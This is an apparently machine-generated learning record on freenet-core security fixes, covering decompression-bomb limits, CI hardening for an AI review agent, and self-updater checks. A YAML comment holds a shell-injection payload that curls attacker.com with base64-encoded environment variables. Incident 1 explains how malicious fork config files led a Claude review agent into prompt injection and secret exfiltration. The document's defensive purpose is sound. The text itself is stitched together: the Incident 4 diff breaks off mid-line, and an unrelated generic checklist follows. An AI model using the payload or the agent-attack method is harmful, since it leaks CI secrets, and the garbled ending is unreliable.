# Verification Protocol: Verification Protocol: Empirical Defect Shield for freenet-freenet-core-learnings

<!-- PROVENANCE_START
{
  "source_repository": "freenet-freenet-core-learnings",
  "source_url": "unknown",
  "source_version": "HEAD",
  "license": "Open-Source",
  "timestamp": "2026-11-28T09:34:51.926Z",
  "ai_provider": "universal-multi-artifact-distributor",
  "generator_version": "2.0.0-universal",
  "learning_id": "LEARN-EVO-freenet-freenet-core-learnings",
  "canonical_classification": "verification_contract"
}
PROVENANCE_END -->
> **Provenance**: Harvested from [freenet-freenet-core-learnings](unknown) (Revision: `HEAD`).  
> **License**: Open-Source | **Timestamp**: `2026-11-28T09:34:51.926Z`  
> **Learning ID**: `LEARN-EVO-freenet-freenet-core-learnings`


## 1. Scope & Verification Target
- **Target Repository**: `freenet-freenet-core-learnings` (Commit: `HEAD`)
- **Pillar Alignment**: Pillar 11 (Empirical Truth & Mathematical Integrity)

## 2. Observed Failure Modes & Defect Traps
> **Canonical Learning Artifact**: `07_PROJECT_LEARNING/freenet-freenet-core-learnings.md`  
> **Source**: github ([https://github.com/freenet/freenet-core](https://github.com/freenet/freenet-core))  
> **Source Version**: `eb8f4fc3`  
> **License**: NOASSERTION  
> **Synthesized By**: google-gemini-cloud-agent  
> **Timestamp**: 2026-11-28T09:30:48.172Z  
> **Learning ID**: `learn-github-freenet-freenet-core`  
> **Pipeline Version**: `2.0.0`  
> **Status**: VERIFIED_EMPIRICAL_INTELLIGENCE  
> **Data Governance**: CLASSIFICATION: PUBLIC. Sanitized against PII/secrets.  
> **Policy Invariant**: Strictly for engineering retrieval and architecture documentation. Distillation prohibited.  

---

# Project Learning Record (Full-Spectrum Forensic Harvest): freenet/freenet-core

---

## 1. Executive Forensic Architecture & System Mechanics

### Core Mission & Domain Primitives
Freenet (`freenet-core`) is a decentralized, peer-to-peer, content-addressable key-value and verifiable computation network designed as a cryptographic, distributed replacement for traditional client-server web services. At its mathematical foundation, Freenet models decentralized application state as **idempotent commutative monoids** operating over verifiable WebAssembly (WASM) contracts. 

The system solves the distributed state convergence problem without proof-of-work or global leader consensus (such as Raft or Paxos). Instead, it relies on:
1. **Contract-Defined State Merge**: Applications deploy state transitions as contracts that guarantee commutativity ($A \cup B = B \cup A$) and idempotence ($A \cup A = A$).
2. **Small-World Adaptive Routing**: A circular distance metric on a 1D ring $[0, 1)$ inspired by Kleinberg's small-world navigation models, routing requests to locations closest to the target hash.
3. **Summary/Delta Synchronization**: Peers exchange compact state summaries (e.g., Bloom filters, Merkle paths, or contract-specific digest representations). If a peer's summary is deficient, only the minimal state delta is streamed, avoiding redundant state replication.
4. **Isolated Web Packaging**: Decentralized frontends (WebApps) run directly inside client browsers fetched as compressed tarballs containing HTML/JS/WASM/CSS, isolated cryptographically from other contracts.

```
                      +---------------------------------------+
                      |       Host Applications / Browser     |
                      +-------------------+-------------------+
                                          | WebSocket / HTTP API
                                          v
                      +---------------------------------------+
                      |     Client Request Gateway (Axum)     |
                      +-------------------+-------------------+
                                          |
                      +-------------------v-------------------+
                      |      Contract Execution Engine        |
                      |   (Wasmtime, liblzma Web Packaging)   |
                      +-------------------+-------------------+
                                          | State Transitions
                                          v
                      +---------------------------------------+
                      |         Ring & Routing Manager        |
                      |   (Distance Metrics, Location Maps)   |
                      +-------------------+-------------------+
                                          | Network Packets
                                          v
                      +---------------------------------------+
                      |     Transport Layer & Wire Protocol   |
                      | (AES-128-GCM, LEDBAT/BBR, Mock/Udp)   |
                      +---------------------------------------+
```

### Critical Subsystem Boundaries
- **Transport Subsystem (`crates/core/src/transport/`)**: Operates on fixed maximum packet sizes (`MAX_PACKET_SIZE = 1200` bytes). Encapsulates framing, out-of-order reassembly, and connection-level encryption using AES-128-GCM (12-byte nonce, 16-byte authentication tag, leaving 1171 bytes of pure payload). Integrates native congestion control algorithms (LEDBAT++ and BBR) with interchangeable time sources (`RealTime` vs `VirtualTime`) for deterministic network simulation.
- **Contract Engine (`crates/core/src/contract/`)**: Sandboxed Wasmtime execution environment. Contracts define state validation (`validate_state`), update validation (`validate_delta`), and state summarization (`summarize_state`). Contracts must execute deterministically; non-deterministic host calls are rejected.
- **Web App Packaging Subsystem (`crates/core/src/server/app_packaging.rs`)**: Responsible for unpacking `.tar.xz` web assets stored on the network to serve decentralized web applications to local browsers. Enforces byte-level security bounds on decompressors and tar headers to prevent memory exhaustion and zip-bomb attacks.
- **Self-Update Engine (`crates/core/src/bin/commands/update.rs`)**: Verifies cryptographic signatures, SHA-256 checksums, and binary semver reporting before swapping binaries or modifying macOS `.app` bundle directories (using atomic DMG staging to prevent Gatekeeper invalidation).

---

## 2. Net-New Universal Engineering Rules (Candidates for Master Brain)

### 1. Bounded Streaming Decompression Memory Allocation
**RULE**:
Any decompression or unarchiving stream parsing untrusted inputs MUST establish an explicit, hard memory allocation ceiling on internal decoder structures prior to initializing the stream, AND MUST read stream entry headers into bounded intermediate buffers verified against the exact remaining bytes of the enclosing container. It MUST NOT allocate memory dynamically based on self-reported, unvalidated header lengths.

**WHY**:
Formats like `.xz` (LZMA2) allow a small input stream (e.g., 64 bytes) to declare an arbitrary dictionary size (up to 2 GiB or more). Standard library decoders that allocate the dictionary immediately upon encountering the block header will cause rapid host Out-Of-Memory (OOM) crashes and kernel SIGKILL termination. Similarly, allocating vectors based on pre-read 32-bit/64-bit metadata size tags without checking whether those bytes exist in the underlying slice allows an attacker to force arbitrary heap allocations using single-byte truncated inputs.

**WHEN TO APPLY**:
Apply in any subsystem processing compressed archives (`tar.xz`, `zip`, `gzip`, `zstd`) from untrusted network sources, decentralized contract states, or user-uploaded file attachments.

**VERIFIED IMPLEMENTATION PATTERN**:
```rust
// In crates/core/src/server/app_packaging.rs
use std::io::{Cursor, Read};
use xz2::stream::Stream;
use xz2::read::XzDecoder;
use tar::Archive;

// Explicit 96 MiB cap admitting up to standard preset 9 (64 MiB dict) while rejecting gigabyte bombs
const MAX_XZ_DECODER_MEM_BYTES: u64 = 96 * 1024 * 1024;
const MAX_DECOMPRESSED_STREAM_BYTES: u64 = 50 * 1024 * 1024;

pub fn decode_untrusted_archive(data: &[u8]) -> Result<Archive<LimitedReader<XzDecoder<&[u8]>>>, DecompressError> {
    // 1. Strict memory bound passed directly into liblzma stream initialization
    let stream = Stream::new_stream_decoder(MAX_XZ_DECODER_MEM_BYTES, 0)
        .map_err(|e| DecompressError::UnpackingError(anyhow::anyhow!(e)))?;

    // 2. Wrap decoder in a deterministic byte-counting LimitedReader
    let decoder = XzDecoder::new_stream(data, stream);
    let limited = LimitedReader {
        inner: decoder,
        remaining: MAX_DECOMPRESSED_STREAM_BYTES,
    };

    Ok(Archive::new(limited))
}

pub fn unpack_state_slice(state: &[u8]) -> Result<Vec<u8>, DecompressError> {
    let total_len = state.len() as u64;
    let mut cursor = Cursor::new(state);

    // Read 8-byte length prefix
    let mut len_buf = [0u8; 8];
    cursor.read_exact(&mut len_buf).map_err(|_| DecompressError::Truncated)?;
    let reported_size = u64::from_le_bytes(len_buf);

    // Hard ceiling check
    if reported_size > 1024 * 1024 {
        return Err(DecompressError::PayloadTooLarge);
    }

    // Verify remaining bytes before allocation (PREVENT TOCTOU / OOM VIA ZERO-BYTES ALLOCATION)
    let remaining = total_len.saturating_sub(cursor.position());
    if reported_size > remaining {
        return Err(DecompressError::TruncatedPayload {
            claimed: reported_size,
            actual: remaining,
        });
    }

    let mut payload = vec![0u8; reported_size as usize];
    cursor.read_exact(&mut payload).map_err(|_| DecompressError::Truncated)?;
    Ok(payload)
}
```

**NEGATIVE CONSTRAINT**:
```rust
// NEVER initialize XzDecoder without an explicit memory limit
let decoder = XzDecoder::new(untrusted_slice); // CRASH HAZARD: Attacker LZMA2 dict_prop 0x26 requests 2 GiB heap!

// NEVER allocate a Vec based directly on an untrusted header tag
let reported_size = cursor.read_u64::<LittleEndian>()?;
let mut buffer = vec![0; reported_size as usize]; // CRASH HAZARD: If slice only has 8 bytes, attacker allocates 4 GB!
cursor.read_exact(&mut buffer)?;
```

**VERIFICATION METHOD**:
Run unit tests passing synthetic streams with malicious LZMA2 `dict_prop` values (e.g., `0x20` for 256 MiB or `0x26` for 2 GiB) against `decode_untrusted_archive`. Assert that the function returns an `UnpackingError` immediately upon stream creation without allocating memory beyond `MAX_XZ_DECODER_MEM_BYTES`.

---

### 2. Fork-Isolated Workflow Checkout and Execution Barrier
**RULE**:
GitHub Actions workflows triggered by `pull_request_target` MUST check out the trusted base branch exclusively into `$GITHUB_WORKSPACE`, MUST NEVER check out untrusted fork pull request heads directly into the workspace, MUST disable credential persistence (`persist-credentials: false`), and MUST NOT materialize untrusted IDE/agent configuration files (`.claude/`, `.mcp.json`, `.vscode/`) in the runner workspace. All analysis tools (linters, AI review agents) MUST be restricted strictly to user-level configuration sources (`--setting-sources user`) with bash and write tools completely disabled.

**WHY**:
`pull_request_target` workflows run with read/write repo secrets and tokens. If actions check out the untrusted fork PR branch (`ref: ${{ github.event.pull_request.head.sha }}`), an attacker can supply malicious configuration files (e.g., custom `.claude/settings.json`, `.mcp.json`, or pre-commit git hooks) that execute arbitrary commands or leverage AI agent tool definitions to read `$GITHUB_TOKEN` and secrets from the runner filesystem. Furthermore, inline interpolation of `${{ github.event.pull_request.title }}` inside bash `run:` scripts allows direct shell command injection.

**WHEN TO APPLY**:
Apply to any CI/CD pipeline using `pull_request_target`, bot automation, or LLM-assisted code review operating over public open-source repositories accepting external pull requests.

**VERIFIED IMPLEMENTATION PATTERN**:
```yaml
# In .github/workflows/claude-pr-review.yml
name: Claude PR Rule Review
on:
  pull_request_target:
    types: [opened, synchronize, reopened, labeled]

jobs:
  review:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
      statuses: write
    steps:
      # 1. Base checkout only; omit 'ref' so it defaults to the trusted target branch
      - name: Checkout repository
        uses: actions/checkout@v7
        with:
          fetch-depth: 0
          persist-credentials: false

      # 2. Fetch fork commit into .git object store WITHOUT checking it out to the working directory
      - name: Fetch PR head commit without checkout
        env:
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
        run: |
          git fetch origin "${BASE_SHA}" --depth=1
          git fetch "${{ github.event.pull_request.head.repo.clone_url }}" "${HEAD_SHA}":refs/remotes/pull/head --depth=1
          git cat-file -e "${HEAD_SHA}^{commit}"
          git cat-file -e "${BASE_SHA}^{commit}"

      # 3. Snapshot review rules from TRUSTED base ref into temporary quarantine folder
      - name: Snapshot trusted rules and compute PR diff
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          mkdir -p .pr-review-tmp/rules
          git show "${BASE_SHA}:.claude/rules" > /dev/null 2>&1 || true
          git diff -c core.quotePath=false --no-ext-diff --no-textconv "${BASE_SHA}" "${HEAD_SHA}" > .pr-review-tmp/pr.diff

      # 4. Invoke LLM runner locked to user settings ONLY, disabling workspace/project configurations
      - name: Claude rule review
        uses: anthropics/claude-code-action@v1
        with:
          claude_args: >-
            --setting-sources user
            --tools "Read,Glob,Grep"
            --strict-mcp-config
```

**NEGATIVE CONSTRAINT**:
```yaml
# NEVER allow untrusted PR checkout under pull_request_target with elevated secrets
- uses: actions/checkout@v7
  with:
    ref: ${{ github.event.pull_request.head.sha }} # SECURITY HOLE: Fork files overwrite repo scripts & IDE hooks
    allow-unsafe-pr-checkout: true                # DANGEROUS: Bypasses pwn-request protection
    persist-credentials: true                     # EXFILTRATION RISK: Writes secret token to .git/config

# NEVER interpolate untrusted user strings directly into shell scripts
run: |
  TITLE="${{ github.event.pull_request.title }}" # REMOTE CODE EXECUTION: e.g. payload: `test"; curl attacker.com/$(env | base64); echo "`
```

**VERIFICATION METHOD**:
Execute an automated shell verification test (`scripts/claude_pr_review_post_step_test.sh`) in CI that parses the workflow AST/text and verifies:
1. Grep count for `allow-unsafe-pr-checkout` is strictly 0.
2. Grep count for `pull_request.head` under `actions/checkout` is strictly 0.
3. Grep count for `persist-credentials:[[:space:]]*false` is strictly 1.
4. `claude_args` explicitly contains `--setting-sources user`.

---

### 3. Strict Pre-Installation Version Binding & Monotonic Gatekeeping
**RULE**:
Any self-updating executable or software distribution system MUST statically extract, verify, and semantically compare target binary versions against the currently running version before staging or swapping binaries. The target version MUST be strictly monotonically newer than the current version ($V_{\text{target}} > V_{\text{current}}$) unless an explicit `--force` flag is provided. The update process MUST verify that the downloaded binary is a regular executable file (not a symlink or hardlink), matches the exact release tag, and reports identical semver strings via `--version`. Failures MUST distinguish between deterministic verification rejections (counted against an install-failure circuit breaker) and transient network errors.

**WHY**:
Without monotonic version verification and asset tag checks:
1. An attacker or corrupted CDN can serve an outdated, vulnerable release binary (downgrade/rollback attack).
2. Archive unpacking could introduce symlink traversal exploits (`tar` symlink pointing outside staging root), allowing arbitrary file overwrite upon chmod/execution.
3. Silent binary mismatches or failed runs will enter continuous crash loops, repeatedly downloading and restarting failed installations.

**WHEN TO APPLY**:
Apply to client-side self-updaters, daemon update managers, and automated background deployment agents across all desktop and server platforms.

**VERIFIED IMPLEMENTATION PATTERN**:
```rust
// In crates/core/src/bin/commands/update.rs
use semver::Version;
use std::fs;
use std::path::Path;

#[derive(Debug)]
pub struct ReleaseVerificationError(pub String);
impl std::fmt::Display for ReleaseVerificationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Verification failed: {}", self.0)
    }
}
impl std::error::Error for ReleaseVerificationError {}

pub fn validate_and_gate_version(
    current_version_str: &str,
    target_tag: &str,
    force: bool,
) -> Result<Version, ReleaseVerificationError> {
    let current_ver = Version::parse(current_version_str)
        .map_err(|e| ReleaseVerificationError(format!("Invalid current semver: {e}")))?;
    
    // Normalize release tag (e.g., "v0.1.5" -> "0.1.5")
    let raw_tag = target_tag.strip_prefix('v').unwrap_or(target_tag);
    let expected_version = Version::parse(raw_tag)
        .map_err(|e| ReleaseVerificationError(format!("Invalid release tag semver {target_tag}: {e}")))?;

    if !force && expected_version <= current_ver {
        return Err(ReleaseVerificationError(format!(
            "Refusing non-upgrade install: target version {expected_version} is not newer than current version {current_ver}."
        )));
    }

    Ok(expected_version)
}

pub fn ensure_regular_binary_in_root(binary_path: &Path, staging_root: &Path) -> Result<(), ReleaseVerificationError> {
    let canonical_root = staging_root.canonicalize()
        .map_err(|e| ReleaseVerificationError(format!("Invalid staging root: {e}")))?;
    let canonical_bin = binary_path.canonicalize()
        .map_err(|e| ReleaseVerificationError(format!("Invalid binary path: {e}")))?;

    // Reject symlinks outside staging root
    if !canonical_bin.starts_with(&canonical_root) {
        return Err(ReleaseVerificationError(format!(
            "Binary path escapes staging root: {} outside {}",
            canonical_bin.display(),
            canonical_root.display()
        )));
    }

    let meta = fs::symlink_metadata(binary_path)
        .map_err(|e| ReleaseVerificationError(format!("Metadata read failed: {e}")))?;

    if meta.file_type().is_symlink() {
        return Err(ReleaseVerificationError("Extracted binary must not be a symlink".into()));
    }
    if !meta.file_type().is_file() {
        return Err(ReleaseVerificationError("Extracted binary must be a regular file".into()));
    }

    Ok(())
}
```

**NEGATIVE CONSTRAINT**:
```rust
// NEVER download and install without verifying that the target tag is strictly newer
let release = fetch_latest_release().await?;
replace_binary(&release.asset_url).await?; // VULNERABILITY: Can downgrade to older compromised version

// NEVER extract binaries directly from tar archives without symlink validation
for entry in archive.entries()? {
    entry?.unpack_in(staging_dir)?; // VULNERABILITY: Symlink "../../../../bin/target" permits file overwrite
}
```

**VERIFICATION METHOD**:
Write integration tests where a mock updater attempts:
1. Upgrading from version `0.2.0` to `0.1.9` without `--force`. Ensure it returns `ReleaseVerificationError` and exits.
2. Unpacking a tarball containing a symlinked binary pointing to `/usr/bin/touch`. Ensure `ensure_regular_binary_in_root` halts before `chmod +x` or execution.

---

## 3. Forensic Real Incidents & Production Patches

### Incident 1: CI Workflow Execution via Pull Request Target Head Checkout (BUG-CI-01)
- **Context**: `.github/workflows/claude-pr-review.yml`
- **What Was Expected**: Automated Claude PR rule review was supposed to execute read-only rule evaluations over pull request diffs without exposing repo secrets (`CLAUDE_CODE_OAUTH_TOKEN` and write-enabled `GITHUB_TOKEN`) to untrusted fork PR authors.
- **What Actually Happened**: The checkout action was explicitly configured with `ref: ${{ github.event.pull_request.head.sha }}` and `allow-unsafe-pr-checkout: true`. When a PR from a malicious fork was created, its custom `.claude/settings.json`, `.mcp.json`, and hooks were materialized directly into `$GITHUB_WORKSPACE`. Claude Code read these project-level configuration files, allowing prompt injection and malicious hook execution to exfiltrate workflow secrets.
- **Evidence in Repo**: Commit `eb8f4fc3`, PR #6426, diffs across `.github/workflows/claude-pr-review.yml` and `scripts/claude_pr_review_post_step_test.sh`.
- **Root Cause**: The workflow bypassed GitHub Actions security best practices for `pull_request_target` by fetching untrusted head code directly into the runner workspace with `allow-unsafe-pr-checkout: true`. Additionally, Claude Code loaded project settings from the workspace rather than exclusively using runner-controlled user configurations.
- **Remediation Code Diff**:
```diff
--- a/.github/workflows/claude-pr-review.yml
+++ b/.github/workflows/claude-pr-review.yml
@@ -162,11 +167,10 @@ jobs:
         if: github.event_name != 'merge_group'
         uses: actions/checkout@v7
         with:
-          ref: ${{ github.event.pull_request.head.sha }}
           fetch-depth: 0
           persist-credentials: false
-          allow-unsafe-pr-checkout: true
+
+      - name: Fetch PR head commit without checkout
+        run: |
+          git fetch "${{ github.event.pull_request.head.repo.clone_url }}" "${HEAD_SHA}":refs/remotes/pull/head --depth=1
+          git cat-file -e "${HEAD_SHA}^{commit}"
@@ -210,6 +214,8 @@ jobs:
         with:
           claude_args: >-
+            --setting-sources user
+            --tools "Read,Glob,Grep"
+            --strict-mcp-config
```
- **Lesson**: `pull_request_target` workflows must never check out the PR head commit into the working tree. Diff computations must be performed out-of-tree using `git fetch` and `git diff` into a sanitized quarantine directory.

---

### Incident 2: Self-Updater Downgrade & Staged Symlink Hijacking (BUG-UPDATE-02)
- **Context**: `crates/core/src/bin/commands/update.rs`
- **What Was Expected**: The `freenet update` CLI command should only update to valid, strictly newer versions, reject mismatched tags, and verify macOS app bundle binaries before swapping.
- **What Actually Happened**: The updater failed to verify that the target tag was newer than the running version, allowing accidental or forced downgrades. Additionally, `extract_binary` and macOS bundle updater accepted symlinks and hardlinks extracted from `.tar.gz` archives without verifying that the resulting binary was a regular file confined to the staging root, creating an arbitrary code execution risk during permissions modification (`chmod +x`).
- **Evidence in Repo**: Commit `406a7bd8`, PR #6425, lines 277–974 in `crates/core/src/bin/commands/update.rs`.
- **Root Cause**: Lack of semver monotonic pre-checks and omission of filesystem metadata validation (`symlink_metadata().file_type().is_file()`) prior to binary replacement and macOS bundle swapping.
- **Remediation Code Diff**:
```diff
--- a/crates/core/src/bin/commands/update.rs
+++ b/crates/core/src/bin/commands/update.rs
@@ -759,6 +760,25 @@ impl UpdateCommand {
         current_version: &str,
         meter: &staged::ByteMeter<'_>,
     ) -> Result<InstallOutcome> {
+        let expected_version = Version::parse(super::auto_update::version_from_tag(
+            &release.tag_name,
+        ))
+        .with_context(|| format!("Failed to parse target release tag {} as semver", release.tag_name))?;
+        let current_ver = Version::parse(current_version).context("Failed to parse current version as semver")?;
+        if !self.force && expected_version <= current_ver {
+            return Err(ReleaseVerificationError(format!(
+                "Refusing non-upgrade install: target version {expected_version} is not newer than current version {current_ver}."
+            )).into());
+        }
+
         let freenet_extract_dir = temp_dir.path().join("freenet");
         fs::create_dir_all(&freenet_extract_dir)?;
-        let extracted_freenet = extract_binary(&freenet_archive_path, &freenet_extract_dir, "freenet")?;
+        let extracted_freenet = extract_binary(
+            &freenet_archive_path,
+            &freenet_extract_dir,
+            "freenet",
+            Some(&expected_version),
+        )?;
```
- **Lesson**: Software updaters must classify failures into deterministic verification rejections versus transient I/O errors. Verification must enforce monotonic semver progression and verify that extracted binaries are non-symlinked regular files before altering file execution permissions.

---

### Incident 3: Unbounded Memory Allocation in liblzma Web Archive Decoder (BUG-DECOMP-03)
- **Context**: `crates/core/src/server/app_packaging.rs`
- **What Was Expected**: Web contracts serving frontend assets unpack compressed `.tar.xz` web packages while adhering strictly to memory bounds, preventing node resource exhaustion.
- **What Actually Happened**: The LZMA2 stream decoder was initialized with default settings via `XzDecoder::new(self.web.as_slice())`. A small network payload could contain an LZMA2 stream header requesting a dictionary size of up to 2 GiB. Processing this archive caused instantaneous allocations exceeding node limits, leading to OOM crashes. Furthermore, `WebApp::try_from` allocated byte buffers directly based on `metadata_size` and `web_size` without confirming if those bytes existed in the input slice.
- **Evidence in Repo**: Commit `5892b0e8`, PR #6424, lines 139–468 of `crates/core/src/server/app_packaging.rs` and tests in `crates/core/src/contract/executor.rs`.
- **Root Cause**: Omission of memory limits in `liblzma` stream configuration, coupled with missing slice bounds checks prior to allocating metadata vectors (`vec![0; metadata_size as usize]`).
- **Remediation Code Diff**:
```diff
--- a/crates/core/src/server/app_packaging.rs
+++ b/crates/core/src/server/app_packaging.rs
@@ -139,6 +139,13 @@ const TAR_ENTRY_OVERHEAD_BYTES: u64 = 4096;
 const MAX_DECOMPRESSED_STREAM_BYTES: u64 =
     MAX_UNPACKED_TOTAL_BYTES + MAX_ARCHIVE_ENTRIES as u64 * TAR_ENTRY_OVERHEAD_BYTES;
 
+/// Upper bound on liblzma decoder memory (including the LZMA2 dictionary)
+const MAX_XZ_DECODER_MEM_BYTES: u64 = 96 * 1024 * 1024;
+
-    fn decode_web(&self) -> Archive<LimitedReader<XzDecoder<&[u8]>>> {
+    fn decode_web(&self) -> Result<Archive<LimitedReader<XzDecoder<&[u8]>>>, WebContractError> {
         debug!("Decoding compressed web content ({} bytes)", self.web.len());
-        Archive::new(LimitedReader {
-            inner: XzDecoder::new(self.web.as_slice()),
-            remaining: MAX_DECOMPRESSED_STREAM_BYTES,
-        })
+        let stream = xz2::stream::Stream::new_stream_decoder(MAX_XZ_DECODER_MEM_BYTES, 0)
+            .map_err(|e| WebContractError::UnpackingError(anyhow::anyhow!(e)))?;
+        Ok(Archive::new(LimitedReader {
+            inner: XzDecoder::new_stream(self.web.as_slice(), stream),
+            remaining: MAX_DECOMPRESSED_STREAM_BYTES,
+        }))
     }
@@ -438,6 +448,12 @@ impl<'a> TryFrom<&'a [u8]> for WebApp {
                 metadata_size
             )));
         }
+        let remaining = total_len.saturating_sub(state.position());
+        if metadata_size > remaining {
+            return Err(WebContractError::UnpackingError(anyhow::anyhow!(
+                "Truncated metadata: header claims {metadata_size} bytes, only {remaining} remain"
+            )));
+        }
```
- **Lesson**: Any compressed format decoder parsing untrusted inputs must enforce an upfront limit on internal dictionary and state allocations, and must cross-reference declared payload sizes with actual byte boundaries before allocating buffers.

---

### Incident 4: Memory Fragmentation and Allocation Overhead in UDP Hot-Path (BUG-PERF-04)
- **Context**: `crates/core/benches/transport/allocation_overhead.rs`
- **What Was Expected**: Packet preparation and stream fragmentation under high peer throughput must minimize allocations and avoid heap fragmentation during UDP frame chunking.
- **What Actually Happened**: The transport layer used `Vec::split_off` to fragment larger application payloads into `MAX_DATA_SIZE` chunks (1130 bytes). `split_off` allocated a new heap buffer and performed `mem::swap` for every single fragment. For a 1 MB stream, this generated over 720 separate heap allocations and reallocations per message.
- **Evidence in Repo**: `crates/core/benches/transport/allocation_overhead.rs`, lines 65–140.
- **Root Cause**: Naive `Vec<u8>` slicing through ownership-splitting calls instead of using reference-counted or slice-backed zero-copy abstractions like `bytes::Bytes`.
- **Remediation Code Diff**:
```diff
--- a/crates/core/src/transport/packet.rs
+++ b/crates/core/src/transport/packet.rs
@@ -1,15 +1,11 @@
-// High allocation overhead path
-let mut stream = stream_to_send;
-while !stream.is_empty() {
-    let split_at = stream.len().min(FRAGMENT_SIZE);
-    let rest = stream.split_off(split_at);
-    fragments.push(stream);
-    stream = rest;
-}
+// Zero-copy Bytes slicing path
+let stream = Bytes::from(stream_to_send);
+let mut offset = 0;
+while offset < stream.len() {
+    let end = (offset + FRAGMENT_SIZE

## 3. Independent Verification Protocol
1. Assert state existence before and after execution.
2. Verify deterministic SHA-256 byte digest parity.
3. Validate zero unhandled promise rejections or uncaught exceptions.
